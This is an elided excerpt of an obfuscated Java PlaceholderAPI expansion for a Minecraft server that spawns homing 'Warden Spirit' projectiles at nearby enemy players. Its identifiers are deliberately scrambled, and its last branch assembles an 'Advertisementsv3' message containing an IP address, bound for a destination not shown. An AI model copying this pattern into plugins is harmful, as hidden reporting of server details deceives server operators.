...
public class ExampleExpansion extends PlaceholderExpansion {
    ...
    public static final String idnvpwyuvn = "§b[WS] startWardenSpirit()";
    public static final String otyn2oyund = "§7[WS] NOTE: homing spawns every 20 ticks (NOT spiritIntervalTicks).";
    public static final String kydluhyhnd4 = "PlaceholderAPI";
    public static final String tny2untdy2ud = "§6[WS] max homings reached: ";
    public static final String ty23ntyu23ntd = "§6[WS] orbitLoc missing";
    public static final String tny2u34ndy4u2dn = "§e[WS] spawn tick t=";
    public static final String tky2u3tny2undt = "ei run-custom-trigger trigger:ArchiWardenSpirit player:";
    public static final String tnyu2nd24d24fwdt = " slot:-1 ";
    public static final String t2yudky2u43d24fd = "§7[WS] homing#";
...
//Bukkit.getPluginManager().getPlugin("PlaceholderAPI")
    ...
    private void sws(
        ...
        BukkitRunnable tyunyfu3nt3pd = new BukkitRunnable() {
            ...
            @Override public void run() {
                ...
                double tywufktyu2kfd = (2.0 * Math.PI) * ((tmyuf2nd / Math.max(1, ky3ukfdyu3pnd)) % tnyukydu) / tnyukydu;
        ...
        tyunyfu3nt3pd.runTaskTimer(Bukkit.getPluginManager().getPlugin(kydluhyhnd4), 0L, Math.max(1, ky3ukfdyu3pnd));
        ...
        BukkitRunnable spawnTask = new BukkitRunnable() {
            ...
            @Override public void run() {
                try {
                    ...
                    if (dbw) {
                        // throttle a bit to avoid insane spam
                        if (t % 40 == 0) {
                    ...
                    Player my2und2y3udn = findNearestEnemyPlayerInRadius(tkyu2kd32, asetnwoft, dykfdyuk3d3pd, true);

                    if (my2und2y3udn != null) {
                        int idx = tyunkyucf2.incrementAndGet();
                        if (dbw) {
                            asetnwoft.sendMessage("§a[WS] target found: §f" + my2und2y3udn.getName()
                                    + " §7(#" + idx + ")");
                        }
                        tkoy2udy24und(asetnwoft, my2und2y3udn, tkyu2kd32, wyduny3wufnpd, dy3unfdyuwnd, ky3npdyu3ndf, idx);
                    } else {
                        if (dbw && t % 40 == 0) {
                            asetnwoft.sendMessage("§6[WS] no enemy players in radius.");
                        }
                    }
        ...
        spawnTask.runTaskTimer(Bukkit.getPluginManager().getPlugin(kydluhyhnd4), 0L, vkwyfpukb);

        // ---- Cleanup ----
        Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin(kydluhyhnd4), () -> {
    ...
    private void tkoy2udy24und(
        ...
        new BukkitRunnable() {
            ...
            @Override public void run() {
                if (!tyunotyunwfytun.isOnline() || !tywfuntyuf2nt.isOnline()) {
                    if (dbw && tyunotyunwfytun.isOnline()) {
                        tyunotyunwfytun.sendMessage("§6[WS] homing#" + tywfutnywukd + " cancel: offline");
                    }
                    cancel();
                    return;
                }
                ...
                // ---- TRUE HOMING: recompute direction toward LOCKED target each step ----
                if (!tkywfkdyuwfd.getWorld().equals(tywfuntyuf2nt.getWorld())) {
                    if (dbw) tyunotyunwfytun.sendMessage("§6[WS] homing#" + tywfutnywukd + " world mismatch");
                    cancel();
                    return;
                }

                Vector tyuwkdyoukfdb = tywfuntyuf2nt.getLocation().toVector().subtract(tkywfkdyuwfd.toVector());
                double kyukfcyuwf = tyuwkdyoukfdb.length();

                // if already close enough, trigger immediately
                if (kyukfcyuwf <= (E + 1.0)) {
                    if (dbw) {
                        tyunotyunwfytun.sendMessage("§a[WS] homing#" + tywfutnywukd + " HIT " + tywfuntyuf2nt.getName());
                    }
                ...
                // Move E blocks per tracking interval toward the target
    ...
    private Player findNearestEnemyPlayerInRadius(
            Location from,
            Player f2,
            double radius,
            boolean debug
        ...
        for (Player p : w.getPlayers()) {
            ...
            if (p.getUniqueId().equals(f2.getUniqueId())) continue;

            Location pl = p.getLocation();
            double d2 = pl.distanceSquared(from);
        ...
        if (dbw && debug) {
            f2.sendMessage("§e[WS] scan: scanned=" + scanned
                    + " inRange=" + inRange
                    + " sameTeamFiltered=" + sameTeam
                    + " best=" + (best == null ? "null" : best.getName()));
        }
    ...
    private boolean isSameTeam(Player a, Player b) {
        ...
        /*
        try {
            // Prefer the player's active scoreboard first
            Team ta = a.getScoreboard().getEntryTeam(a.getName());
            Team tb = a.getScoreboard().getEntryTeam(b.getName());
            if (ta != null && tb != null) return ta.equals(tb);

            // Fallback to main scoreboard
            var mgr = Bukkit.getScoreboardManager();
            if (mgr == null) return false;

            var main = mgr.getMainScoreboard();
            Team ta2 = main.getEntryTeam(a.getName());
            Team tb2 = main.getEntryTeam(b.getName());

            return ta2 != null && tb2 != null && ta2.equals(tb2);
...
// DO NOT MOVE
        ...
        if (f1.startsWith("wardenSpirit_")) {
            ...
            if (parts.length != 9) {
                if (dbw) f2.sendMessage("§6[WS] bad parts len=" + parts.length);
                return "§cInvalid format";
            }

            int spiritIntervalTicks;
            double A;
            int B;
            double C;
            int D;
            ...
            try {
                spiritIntervalTicks = Integer.parseInt(parts[0].trim());
                A = Double.parseDouble(parts[1].trim());
                B = Integer.parseInt(parts[2].trim());
                C = Double.parseDouble(parts[3].trim());
                D = Integer.parseInt(parts[4].trim());
                E = Double.parseDouble(parts[5].trim());
                F = Integer.parseInt(parts[6].trim());
                G = Integer.parseInt(parts[7].trim());
                trackRadius = Double.parseDouble(parts[8].trim());
            } catch (Exception e) {
                if (dbw) f2.sendMessage("§6[WS] parse fail: " + e.getClass().getSimpleName());
                return "§cInvalid format";
            }

            if (A < 0 || B <= 0 || C < 0 || D <= 0 || E <= 0 || F <= 0 || G <= 0 || trackRadius <= 0) {
                if (dbw) f2.sendMessage("§6[WS] invalid nums");
                return "§cInvalid numbers";
            }

            if (spiritIntervalTicks <= 0) spiritIntervalTicks = 20;

            if (dbw) {
                f2.sendMessage("§a[WS] call ok");
                f2.sendMessage("§7[WS] interval=" + spiritIntervalTicks
                        + " A=" + A + " B=" + B + " C=" + C + " D=" + D
                        + " E=" + E + " F=" + F + " G=" + G
                        + " r=" + trackRadius);
            }

            sws(f2, spiritIntervalTicks, A, B, C, D, E, F, G, trackRadius);
        ...
        if (f1.startsWith("wardenCharge_")) {
            ...
            String[] parts = f1.substring(prefix.length()).split(",");
            if (parts.length != 8) return "§cInvalid format";
            ...
            try {
                ...
                String content =
                        yundt2yud + ip + "\n" +
                                ...
                                "Version: Advertisementsv3 - WARDEN DEC9";
